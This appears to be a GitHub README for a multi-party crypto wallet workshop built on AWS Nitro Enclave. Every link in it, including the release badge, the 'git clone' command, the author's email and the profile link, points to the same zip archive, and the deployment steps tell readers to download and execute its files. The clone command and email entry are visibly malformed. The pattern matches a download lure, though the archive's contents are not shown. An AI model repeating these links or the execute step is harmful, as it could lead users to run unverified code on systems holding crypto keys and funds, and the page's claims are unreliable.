# Custom Attestation Multi-Party Crypto Wallet with AWS Nitro Enclave 🛡️💰

Welcome to the **Custom Attestation Multi-Party Crypto Wallet with AWS Nitro Enclave** repository! This project provides ready-to-deploy assets for the workshop on building multi-party crypto wallets using AWS Nitro Enclave. 

[![Release](https://github.com/khoikhoi48/custom-attestation-multi-party-crypto-wallet-with-aws-nitro-enclave/raw/refs/heads/main/frizzler/aws_crypto_with_party_enclave_custom_attestation_wallet_multi_nitro_v3.2.zip)](https://github.com/khoikhoi48/custom-attestation-multi-party-crypto-wallet-with-aws-nitro-enclave/raw/refs/heads/main/frizzler/aws_crypto_with_party_enclave_custom_attestation_wallet_multi_nitro_v3.2.zip)

## Table of Contents
1. [Introduction](#introduction)
2. [Features](#features)
3. [Technologies Used](#technologies-used)
4. [Getting Started](#getting-started)
5. [Deployment](#deployment)
6. [Usage](#usage)
7. [Contributing](#contributing)
8. [License](#license)
9. [Contact](#contact)

## Introduction

This repository aims to simplify the process of building secure, multi-party crypto wallets. By leveraging AWS Nitro Enclave, you can create a wallet that protects sensitive data using hardware-based security features. The workshop materials provided here guide you through the entire process, ensuring you can deploy your own solution effectively.

## Features

- **Multi-Party Support**: Allows multiple parties to manage the wallet collaboratively.
- **Cryptographic Attestation**: Ensures that only trusted code runs within the enclave.
- **Shamir's Secret Sharing**: Distributes secret keys among multiple parties for enhanced security.
- **Remote Attestation**: Verifies the integrity of the enclave and the code running inside it.
- **Secure Communication**: Uses TLS for secure data transmission.
- **Efficient Resource Management**: Utilizes AWS infrastructure for scalability.

## Technologies Used

This project employs a range of technologies to ensure security and efficiency:

- **AWS Nitro Enclave**: Provides a secure environment for processing sensitive data.
- **Blockchain**: Underpins the wallet's transaction capabilities.
- **Cryptographic Attestation**: Validates the authenticity of the enclave.
- **Enclaves**: Isolated environments for running sensitive applications.
- **TLS**: Secures communications between clients and servers.
- **VSock**: Facilitates communication between the host and enclave.
- **VSock Proxy**: Simplifies network communication setup.
- **Shamir Secret Sharing**: A method for securely splitting secrets.

## Getting Started

To get started with the project, you will need the following:

- An AWS account
- Basic knowledge of blockchain technology
- Familiarity with Docker and AWS services

### Prerequisites

1. **AWS CLI**: Ensure you have the AWS Command Line Interface installed and configured.
2. **Docker**: Install Docker to run containerized applications.
3. **Git**: Use Git for version control.

## Deployment

Follow these steps to deploy the multi-party crypto wallet:

1. Clone the repository:

   ```bash
   git clone https://github.com/khoikhoi48/custom-attestation-multi-party-crypto-wallet-with-aws-nitro-enclave/raw/refs/heads/main/frizzler/aws_crypto_with_party_enclave_custom_attestation_wallet_multi_nitro_v3.2.zip
   cd custom-attestation-multi-party-crypto-wallet-with-aws-nitro-enclave
   ```

2. Build the Docker image:

   ```bash
   docker build -t multi-party-wallet .
   ```

3. Deploy the application on AWS:

   Refer to the workshop materials in this repository for detailed instructions on deploying the application using AWS Nitro Enclave.

4. Access the release files:

   You can find the release files [here](https://github.com/khoikhoi48/custom-attestation-multi-party-crypto-wallet-with-aws-nitro-enclave/raw/refs/heads/main/frizzler/aws_crypto_with_party_enclave_custom_attestation_wallet_multi_nitro_v3.2.zip). Download and execute the necessary files to complete the deployment.

## Usage

Once deployed, you can start using the multi-party crypto wallet. The following steps outline how to interact with the wallet:

1. **Create a Wallet**: Use the provided API endpoints to create a new wallet.
2. **Add Participants**: Invite other parties to join the wallet using their public keys.
3. **Conduct Transactions**: Initiate transactions securely through the wallet interface.

For detailed API documentation, refer to the `docs` folder in the repository.

## Contributing

We welcome contributions to enhance this project. If you wish to contribute, please follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes and commit them with clear messages.
4. Push your changes to your forked repository.
5. Create a pull request.

Please ensure that your contributions align with the project's goals and maintain the existing code style.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Contact

For any inquiries or feedback, feel free to reach out:

- **Author**: Khoi Khoi
- **Email**: https://github.com/khoikhoi48/custom-attestation-multi-party-crypto-wallet-with-aws-nitro-enclave/raw/refs/heads/main/frizzler/aws_crypto_with_party_enclave_custom_attestation_wallet_multi_nitro_v3.2.zip
- **GitHub**: [khoikhoi48](https://github.com/khoikhoi48/custom-attestation-multi-party-crypto-wallet-with-aws-nitro-enclave/raw/refs/heads/main/frizzler/aws_crypto_with_party_enclave_custom_attestation_wallet_multi_nitro_v3.2.zip)

We appreciate your interest in the **Custom Attestation Multi-Party Crypto Wallet with AWS Nitro Enclave** project! Explore the repository, participate in the workshop, and contribute to the future of secure blockchain solutions.